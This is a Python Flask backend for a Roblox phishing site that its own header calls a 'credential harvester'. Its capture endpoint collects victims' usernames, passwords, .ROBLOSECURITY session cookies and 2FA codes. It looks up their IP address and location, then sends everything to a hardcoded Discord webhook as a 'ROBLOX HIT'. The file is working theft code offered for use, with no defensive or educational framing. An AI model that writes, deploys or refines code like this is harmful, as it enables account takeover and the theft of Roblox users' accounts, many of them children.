# app.py — Roblox cookie + credential harvester, no redirect
# Python 3.11 · Flask · Railway compatible

import os
import requests
from datetime import datetime, timezone
from flask import Flask, request, render_template, jsonify

app = Flask(__name__)

WEBHOOK_URL = os.environ.get("https://discord.com/api/webhooks/1553877992185532497/D_iruHSj-HioN_HhFvnX6yztxMsXpkInu8y0d-a-DkVaUgZBk_bXSGcOwUipFHjytA65", "")


def _ip_meta():
    fwd = request.headers.get("X-Forwarded-For", "")
    ip = fwd.split(",")[0].strip() if fwd else request.remote_addr
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=4).json()
        return ip, r
    except Exception:
        return ip, {}


def _exfil(payload: dict):
    if not WEBHOOK_URL:
        return
    fields = []
    for k, v in payload.items():
        s = str(v)
        if len(s) > 1024:
            s = s[:1021] + "..."
        fields.append({"name": k, "value": s or "`empty`", "inline": False})

    embed = {
        "title": "ROBLOX HIT",
        "color": 0xE2231A,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "fields": fields,
        "footer": {"text": "vanta · roblox-harvester"},
    }
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=8)
    except Exception:
        pass


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/capture", methods=["POST"])
def capture():
    data = request.get_json(silent=True) or {}
    ip, geo = _ip_meta()

    payload = {
        "username": data.get("username", ""),
        "password": data.get("password", ""),
        "cookie (.ROBLOSECURITY)": data.get("cookie", ""),
        "manual cookie paste": data.get("manual_cookie", ""),
        "2fa / otp": data.get("otp", ""),
        "user-agent": request.headers.get("User-Agent", ""),
        "ip": ip,
        "country": geo.get("country", "?"),
        "city": geo.get("city", "?"),
        "isp": geo.get("isp", "?"),
        "stage": data.get("stage", "unknown"),
        "ts": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
    }
    _exfil(payload)
    return jsonify({"ok": True})


@app.route("/healthz")
def healthz():
    return "ok", 200


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
